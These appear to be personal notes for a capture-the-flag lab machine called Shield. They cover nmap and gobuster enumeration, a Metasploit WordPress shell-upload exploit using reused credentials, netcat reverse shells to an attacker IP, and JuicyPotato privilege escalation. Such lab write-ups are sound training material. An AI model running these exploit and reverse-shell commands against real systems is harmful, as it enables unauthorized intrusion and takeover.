Machine:Shield 
IP:10.10.10.29
OS; Windows server 2016
                            Enum
----------------------------------------------------------
nmap result:
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
----------------------------------------------------------
                  Gobuster/dirbuster
gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
/wordpress
http://10.10.10.29/wordpress
crendentials from previous box admin:P@s5w0rd!
------------------------------------------------------------
                msfconsolE
 msf > use exploit/unix/webapp/wp_admin_shell_upload
> set PASSWORD P@s5w0rd! 
> set USERNAME admin
> set TARGETURI /wordpress
> set RHOSTS 10.10.10.29
set LHOST tun0
> run
------------------------------------------------------------




              Foothold
---------------------------------------------------------------
get shell using meterpreter
upload nc.exe
gain shell in nc
cmmand:----execute -f nc.exe -a "-e cmd.exe 10.10.14.231 4444"-------
----------------------------------------------------------------------
upload juicy potato.exe
changename js.exe
upload js.exe
execute js.exe
command:echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe (IP and nc port) > shell.bat
run shell.bat command:
js.exe-t*-pC:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat-l 1337

flag in C:\users\Administrator\Desktop\ root.txt
